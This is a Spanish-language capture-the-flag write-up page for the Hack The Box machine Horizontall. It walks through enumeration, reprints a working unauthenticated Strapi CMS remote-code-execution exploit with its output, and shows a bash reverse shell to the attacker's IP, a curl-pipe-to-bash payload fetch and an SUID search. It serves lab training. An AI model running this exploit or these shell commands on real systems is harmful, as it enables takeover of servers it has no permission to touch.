@@ -1,0 +1,973 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Horizontall HTB Write-up - grafis Blog</title>
+<meta name="description" content="En este artículo comparto el write up de la máquina Horizontall de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="grafis Blog">
+<meta property="og:title" content="Horizontall HTB Write-up">
+<meta property="og:url" content="http://localhost:4000/Horizontall/">
+
+
+  <meta property="og:description" content="En este artículo comparto el write up de la máquina Horizontall de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/imagenes/Horizontall/horizontall_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-02-09T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/Horizontall/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "grafis",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Horizontall HTB Write-up</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">grafis</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/mirko-babic-velásquez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Horizontall HTB Write-up">
+    <meta itemprop="description" content="En este artículo comparto el write up de la máquina Horizontall de Hack The Box">
+    <meta itemprop="datePublished" content="February 09, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Horizontall HTB Write-up
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-09T00:00:00-05:00">February 09, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/imagenes/Horizontall/Horizontall_banner.png" width="550" height="250" />
+</p>
+
+<h1 id="resumen"><a href="#header-2"></a>Resumen</h1>
+
+<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>Hack The Box</strong> llamada <strong>Horizontall</strong>, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:</p>
+
+<ul>
+  <li>Enumeración del sistema con nmap.</li>
+  <li>Inspección de código fuente de página para encontrar subdominios.</li>
+  <li>Fuzzing para encontrar directorios en página web.</li>
+  <li>Vulnerabilidad en CMS strapi (RCE).</li>
+  <li>Port forwarding utilizando ssh.</li>
+  <li>Vulnerabilidad en Laravel (RCE).</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeración"><a href="#header-2"></a>Reconocimiento y Enumeración</h2>
+
+<p>En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.11.105
+
+PING 10.10.11.105 (10.10.11.105) 56(84) bytes of data.
+64 bytes from 10.10.11.105: icmp_seq=1 ttl=63 time=145 ms
+</code></pre></div></div>
+<p>Se observa que existe una correcta conexión con la máquina.</p>
+
+<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- -sS -open -min-rate 5000 10.10.11.105 -oG Ports
+</code></pre></div></div>
+<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+<p>Realizamos un escaneo de los servicios expuestos utilizando <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p22,80 10.10.11.105 -oN ServiceScan
+</code></pre></div></div>
+
+<p>Como resultado del escaneo tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
+|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
+|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://horizontall.htb
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Observamos que hay un servidor web, en primer lugar utilizaremos la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> para enumerar información:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.11.105
+
+http://10.10.11.105 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], RedirectLocation[http://horizontall.htb], Title[301 Moved Permanently], nginx[1.14.0]
+http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
+</code></pre></div></div>
+
+<p>Observamos un redirect hacia <strong>horizontall.htb</strong>, abriremos el <strong>/etc/hosts</strong> para ingresar esta dirección para que pueda resolver correctamente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.10.11.105    horizontall.htb
+</code></pre></div></div>
+
+<p>Luego, abrimos nuestro navegador para observar que hay en esta página:</p>
+
+<p><img src="/imagenes/Horizontall/horizontall.png" alt="" /></p>
+
+<p>Si analizamos la página e intentamos navegar por ella nos damos cuenta que es solo una página estática, sin embargo, utilizaremos la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code> para buscar directorios:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 horizontall.htb/FUZZ
+
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
+=====================================================================
+
+000000001:   200        1 L      43 W       901 Ch      "# directory-list-2.3-medium.txt"                                                                                                                 
+000000003:   200        1 L      43 W       901 Ch      "# Copyright 2007 James Fisher"                                                                                                                   
+000000007:   200        1 L      43 W       901 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                                 
+000000002:   200        1 L      43 W       901 Ch      "#"                                                                                                                                               
+000000013:   200        1 L      43 W       901 Ch      "#"                                                                                                                                               
+000000039:   301        7 L      13 W       194 Ch      "img"                                                                                                                                             
+000000005:   200        1 L      43 W       901 Ch      "# This work is licensed under the Creative Commons"                                                                                              
+000000004:   200        1 L      43 W       901 Ch      "#"                                                                                                                                               
+000000008:   200        1 L      43 W       901 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                                                                      
+000000010:   200        1 L      43 W       901 Ch      "#"                                                                                                                                               
+000000006:   200        1 L      43 W       901 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                                   
+000000011:   200        1 L      43 W       901 Ch      "# Priority ordered case sensative list, where entries were found"                                                                                
+000000014:   200        1 L      43 W       901 Ch      "http://horizontall.htb/"                                                                                                                         
+000000012:   200        1 L      43 W       901 Ch      "# on atleast 2 different hosts"                                                                                                                  
+000000009:   200        1 L      43 W       901 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                                                             
+000000550:   301        7 L      13 W       194 Ch      "css"                                                                                                                                             
+000000953:   301        7 L      13 W       194 Ch      "js"                                                                                                                                              
+000045240:   200        1 L      43 W       901 Ch      "http://horizontall.htb/"   
+</code></pre></div></div>
+
+<p>Sin embargo, no reportó nada especial. Vamos a revisar el código fuente de la página:</p>
+
+<p><img src="/imagenes/Horizontall/horizontall2.png" alt="" /></p>
+
+<p>Observamos que el código está en una sola linea, lo que dificulta su lectura, si buscamos en la web html pretty online encontramos una web que nos puede ordenar el código:</p>
+
+<p><img src="/imagenes/Horizontall/horizontall3.png" alt="" /></p>
+
+<p>Nos vemos demasiadas cosas, sin embargo, no tenemos más opción que buscar por los archivos .js por información, abriremos el primer archiv .js llamado <strong>js/app.c68eb462.js</strong>:</p>
+
+<p><img src="/imagenes/Horizontall/horizontall4.png" alt="" /></p>
+
+<p>Podemos ver el código js, si lo vamos revisando rápido, observamos algo interesante:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var t=this;r.a.get("http://api-prod.horizontall.htb/reviews")
+</code></pre></div></div>
+
+<p>Tenemos un subdominio, por lo tanto, lo incluiremos en el /etc/hosts:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.10.11.105    horizontall.htb api-prod.horizontall.htb
+</code></pre></div></div>
+
+<p>Al ingresar a la web vemos lo siguiente:</p>
+
+<p><img src="/imagenes/Horizontall/horizontall5.png" alt="" /></p>
+
+<p>En este punto haremos fuzzing utilizando wfuzz para descubrir directorios de interés:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://api-prod.horizontall.htb/FUZZ
+</code></pre></div></div>
+
+<p>Encontramos 2 directorios:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000259:   200        16 L     101 W      854 Ch  "admin"                                                                                                                                           
+000001609:   200        0 L      21 W       507 Ch      "Reviews"    
+</code></pre></div></div>
+
+<p>El <strong>admin</strong> y <strong>Reviews</strong>, vamos a inspecionarlos, para <strong>Reviews</strong>:</p>
+
+<p><img src="/imagenes/Horizontall/horizontall7.png" alt="" /></p>
+
+<p>Para <strong>admin</strong>:</p>
+
+<p><img src="/imagenes/Horizontall/horizontall6.png" alt="" /></p>
+
+<p>Observamos un panel de autenticación, corresponde a un CMS llamado <strong>strapi</strong>, si buscamos vulnerabilidades con la herramienta <code class="language-plaintext highlighter-rouge">searchsploit</code>, tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit strapi
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                   |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                                               | multiple/webapps/50237.py
+Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                                             | multiple/webapps/50238.py
+Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                       | multiple/webapps/50239.py
+Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                                         | nodejs/webapps/50716.rb
+</code></pre></div></div>
+
+<h2 id="explotación"><a href="#header-2"></a>Explotación</h2>
+
+<p>Observamos que existe un exploit para ejecución remota de comandos sin estar autenticado, esto parece prometedor, vamos a inspeccionarlo:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
+# Date: 2021-08-30
+# Exploit Author: Musyoka Ian
+# Vendor Homepage: https://strapi.io/
+# Software Link: https://strapi.io/
+# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
+# Tested on: Ubuntu 20.04
+# CVE : CVE-2019-18818, CVE-2019-19609
+</span>
+<span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">from</span> <span class="nn">cmd</span> <span class="kn">import</span> <span class="n">Cmd</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[-] Wrong number of arguments provided"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Usage: python3 exploit.py &lt;URL&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
+
+
+<span class="k">class</span> <span class="nc">Terminal</span><span class="p">(</span><span class="n">Cmd</span><span class="p">):</span>
+    <span class="n">prompt</span> <span class="o">=</span> <span class="s">"$&gt; "</span>
+    <span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+        <span class="n">code_exec</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">check_version</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">url</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Checking Strapi CMS Version running"</span><span class="p">)</span>
+    <span class="n">version</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/admin/init"</span><span class="p">).</span><span class="n">text</span>
+    <span class="n">version</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">version</span><span class="p">)</span>
+    <span class="n">version</span> <span class="o">=</span> <span class="n">version</span><span class="p">[</span><span class="s">"data"</span><span class="p">][</span><span class="s">"strapiVersion"</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">version</span> <span class="o">==</span> <span class="s">"3.0.0-beta.17.4"</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Seems like the exploit will work!!!</span><span class="se">\n</span><span class="s">[+] Executing exploit</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[-] Version mismatch trying the exploit anyway"</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">password_reset</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">url</span><span class="p">,</span> <span class="n">jwt</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">"code"</span> <span class="p">:</span> <span class="p">{</span><span class="s">"$gt"</span><span class="p">:</span><span class="mi">0</span><span class="p">},</span>
+            <span class="s">"password"</span> <span class="p">:</span> <span class="s">"SuperStrongPassword1"</span><span class="p">,</span>
+            <span class="s">"passwordConfirmation"</span> <span class="p">:</span> <span class="s">"SuperStrongPassword1"</span>
+            <span class="p">}</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/admin/auth/reset-password"</span><span class="p">,</span> <span class="n">json</span> <span class="o">=</span> <span class="n">params</span><span class="p">).</span><span class="n">text</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+    <span class="n">jwt</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="s">"jwt"</span><span class="p">]</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="s">"user"</span><span class="p">][</span><span class="s">"username"</span><span class="p">]</span>
+    <span class="n">email</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="s">"user"</span><span class="p">][</span><span class="s">"email"</span><span class="p">]</span>
+
+    <span class="k">if</span> <span class="s">"jwt"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[-] Password reset unsuccessfull</span><span class="se">\n</span><span class="s">[-] Exiting now</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Password reset was successfully</span><span class="se">\n</span><span class="s">[+] Your email is: </span><span class="si">{</span><span class="n">email</span><span class="si">}</span><span class="se">\n</span><span class="s">[+] Your new credentials are: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">:SuperStrongPassword1</span><span class="se">\n</span><span class="s">[+] Your authenticated JSON Web Token: </span><span class="si">{</span><span class="n">jwt</span><span class="si">}</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">code_exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">global</span> <span class="n">jwt</span><span class="p">,</span> <span class="n">url</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Triggering Remote code executin</span><span class="se">\n</span><span class="s">[*] Rember this is a blind RCE don't expect to see output"</span><span class="p">)</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Authorization"</span> <span class="p">:</span> <span class="sa">f</span><span class="s">"Bearer </span><span class="si">{</span><span class="n">jwt</span><span class="si">}</span><span class="s">"</span><span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"plugin"</span> <span class="p">:</span> <span class="sa">f</span><span class="s">"documentation &amp;&amp; $(</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s">)"</span><span class="p">,</span>
+            <span class="s">"port"</span> <span class="p">:</span> <span class="s">"1337"</span><span class="p">}</span>
+    <span class="n">out</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">/admin/plugins/install"</span><span class="p">,</span> <span class="n">json</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="n">headers</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">out</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="p">(</span><span class="s">"__main__"</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">url</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s">"/"</span><span class="p">):</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">check_version</span><span class="p">()</span>
+    <span class="n">password_reset</span><span class="p">()</span>
+    <span class="n">terminal</span> <span class="o">=</span> <span class="n">Terminal</span><span class="p">()</span>
+    <span class="n">terminal</span><span class="p">.</span><span class="n">cmdloop</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Obsevamos que tiene diferentes funciones, la primera se encarga de verificar la versión de strapi para ver si es vulnerable o no a este exploit. El funcionamiento de este radica en que se puede cambiar la contraseña de administrador en la ruta <strong>admin/auth/reset-password</strong> sin necesidad de estar autenticado, lo que permite hacerse con el nombre de usuario y contraseña (que tu le cambiaste) fácilemente. Luego, utilizando el token <strong>jwt</strong> realiza una petición post hacia <strong>/admin/plugins/install</strong>, en la cual viaja el comando que queremos ejecutar, haciendo que esto se instale como un plugin, haciendo de esta forma posible el <strong>RCE</strong>.</p>
+
+<p>Probemos este exploit a ver si funciona:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 50239.py http://api-prod.horizontall.htb
+[+] Checking Strapi CMS Version running
+[+] Seems like the exploit will work!!!
+[+] Executing exploit
+
+
+[+] Password reset was successfully
+[+] Your email is: admin@horizontall.htb
+[+] Your new credentials are: admin:SuperStrongPassword1
+[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjc1OTc5NTUxLCJleHAiOjE2Nzg1NzE1NTF9.wl6vOWotK3bscBZJm5PuK8fBmoKsZCxByEwD9iYTizo
+
+
+$&gt; 
+</code></pre></div></div>
+
+<p>Ha funcionado, tenemos capacidad de ejecutar comandos en la máquina víctima, ahora intentaremos ganar acceso enviando una shell reversa hacia nuestro equipo. Intentando con varias formas de hacerlo, resultó la siguiente:</p>
+
+<p>En primer lugar, estaremos escuchando por <code class="language-plaintext highlighter-rouge">netcat</code> por el puerto 1235:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1235
+listening on [any] 1235 ...
+</code></pre></div></div>
+
+<p>Luego, utilizando python utilizaremos el modulo <strong>http.server</strong> para compartir el siguiente archivo .html:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.14.17/1235 0&gt;&amp;1
+</code></pre></div></div>
+<p>El cual entablará la conexión reversa a nuestro equipo.</p>
+
+<p>Finalmente, en la máquina víctima haremos un <code class="language-plaintext highlighter-rouge">curl</code> a nuestro servidor http y luego, ejecutar ese contenido con <strong>bash</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.14.17/ | bash
+</code></pre></div></div>
+<p>De esta manera, el servidor en python recibe una petición:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.105 - - [09/Feb/2023 17:10:37] "GET / HTTP/1.1" 200 -
+
+</code></pre></div></div>
+<p>Y por el <code class="language-plaintext highlighter-rouge">netcat</code> recibimos la reverse shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1235
+listening on [any] 1235 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.105] 43042
+bash: cannot set terminal process group (1935): Inappropriate ioctl for device
+bash: no job control in this shell
+strapi@horizontall:~/myapi$ whoami
+whoami
+strapi
+</code></pre></div></div>
+
+<p>Observamos que estamos dentro de la máquina víctima y somos el usuario <strong>strapi</strong>.</p>
+
+<p>Buscamos la flag de usuario:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strapi@horizontall:/home/developer$ cat user.txt
+cat user.txt
+9e65474e1f6d52164d71ed95
+</code></pre></div></div>
+
+<p>Excelente, tenemos la flag del usuario <strong>strapi</strong>.</p>
+
+<h2 id="escalada-de-privilegios"><a href="#header-2"></a>Escalada de privilegios</h2>
+
+<p>Vemos los grupos a los que pertenecemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strapi@horizontall:/home/developer$ id
+id
+uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
+</code></pre></div></div>
+
+<p>Buscamos si tenemos algún permiso <strong>SUID</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strapi@horizontall:/$ find \-perm -4000 2&gt;/dev/null
+find \-perm -4000 2&gt;/dev/null
+./usr/bin/sudo
+./usr/bin/newgidmap
+./usr/bin/traceroute6.iputils
+./usr/bin/newuidmap
+./usr/bin/gpasswd
+./usr/bin/at
+./usr/bin/chfn
+./usr/bin/passwd
+./usr/bin/newgrp
+./usr/bin/pkexec
+./usr/bin/chsh
+./usr/lib/openssh/ssh-keysign
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/snapd/snap-confine
+./usr/lib/policykit-1/polkit-agent-helper-1
+./bin/fusermount
+./bin/ping
+./bin/su
+./bin/umount
+./bin/mount
+</code></pre></div></div>
+<p>Pero no hay nada relevante, bueno no, está el pkexec, sin embargo, no haremos esa escalada.</p>
+
